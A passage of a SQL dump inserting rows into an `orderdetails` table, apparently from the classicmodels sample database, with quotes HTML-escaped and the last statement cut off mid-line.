INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;94.22\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;107.23\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;65.77\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;55.89\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;55.96\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;71.00\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;65.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;35.78\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;91.34\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;85.09\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;99.72\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;113.90\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;76.00\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;70.33\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10106\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;43.70\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;81.35\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;105.86\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;172.36\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;122.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;52.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;96.92\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;73.12\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10107\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;88.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;165.38\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;96.30\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;75.81\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;107.10\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;67.76\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;73.17\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;132.29\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;52.84\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;139.87\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;64.41\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;60.01\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;132.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;67.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;36.21\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;87.76\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10108\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;74.85\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;137.98\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;126.72\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;160.87\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;125.74\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10109\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;32.10\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;118.22\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;51.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;115.69\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;163.69\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;81.91\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;72.02\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;28.88\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;40.77\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;82.69\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112.74\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;80.47\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;96.37\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10110\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;35.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;87.33\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;48.52\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;53.09\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;94.25\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;91.27\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10111\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;85.70\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10112\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;197.16\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10112\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;85.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10113\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;121.64\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10113\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;101.50\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10113\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10113\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;58.82\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;128.53\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;106.78\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;53.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;169.34\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;105.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;102.23\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;28.64\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;88.61\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;43.83\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10114\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;82.94\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;111.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;140.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;56.64\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;106.45\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10115\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;100.70\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10116\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;60.28\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;195.33\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;148.06\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;173.02\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;121.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;81.68\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;122.08\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;73.73\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;119.20\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;55.65\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;75.35\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10117\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;52.42\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10118\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;86.15\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;112.88\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;151.38\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;74.84\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;95.28\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;64.40\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;72.58\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;63.12\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;82.18\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;62.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;57.34\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;74.23\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;67.22\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;63.67\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10119\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;40.22\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;118.94\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;158.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;82.79\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;57.54\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;110.45\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;93.01\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;72.36\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;71.73\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;94.90\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;68.79\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;41.46\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;91.34\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;81.77\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;106.79\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10120\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;72.00\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;86.13\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;126.52\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;58.18\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;95.93\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10121\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;72.41\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;155.66\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;113.92\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;65.44\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;104.80\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;114.65\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, 